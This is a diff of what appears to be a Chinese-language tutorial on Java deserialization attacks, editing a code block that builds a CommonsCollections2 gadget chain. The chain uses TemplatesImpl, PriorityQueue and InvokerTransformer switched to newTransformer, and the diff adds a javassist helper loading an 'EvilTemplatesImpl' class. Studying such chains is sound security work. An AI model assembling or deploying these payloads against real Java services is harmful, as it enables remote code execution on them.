@@ -262,6 +262,8 @@ package org.vulhub.Ser;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.functors.InvokerTransformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
@@ -271,7 +273,6 @@ import java.lang.reflect.Field;
 import java.util.Comparator;
 import java.util.PriorityQueue;
 
-import static org.vulhub.Ser.CommonsCollections2TemplatesImpl.getBytescode;
 
 public class CC2_yso_TemplatesImpl {
 
@@ -284,7 +285,7 @@ public class CC2_yso_TemplatesImpl {
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 
         // 创建⼀个⼈畜⽆害的 InvokerTransformer 对象，并先⽤它实例化 Comparator, 避免 queue.add 的时候触发命令
-        // 这里用 toString ，不能用 getClass，因为会导致在compare时两个比较的对象均为Class类型，Class类型是无法进行比较的
+        // 这里用 toString ，不能用 getClass，因为会导致在 compare 时两个比较的对象均为Class类型，Class类型是无法进行比较的
         Transformer transformer = new InvokerTransformer("toString", null, null);
         Comparator comparator = new TransformingComparator(transformer);
 
@@ -295,7 +296,7 @@ public class CC2_yso_TemplatesImpl {
         queue.add(templates);
         queue.add(templates);
 
-        // 最后⼀步，将 toString ⽅法改成恶意⽅法 newTransforme
+        // 最后⼀步，将 toString ⽅法改成恶意⽅法 newTransformer
         setFieldValue(transformer, "iMethodName", "newTransformer");
 
         // 序列化, 保存为文件
@@ -309,6 +310,12 @@ public class CC2_yso_TemplatesImpl {
         Field field = obj.getClass().getDeclaredField(fieldName);
         field.setAccessible(true);
         field.set(obj, value);
+    }
+
+    protected static byte[] getBytescode() throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
+        return clazz.toBytecode();
     }
 
     public static void serialize(Object queue) throws IOException {
@@ -326,7 +333,6 @@ public class CC2_yso_TemplatesImpl {
         ois.readObject();
     }
 }
-
 ```
 
 ## 3.2 无数组的 CommonsCollections4
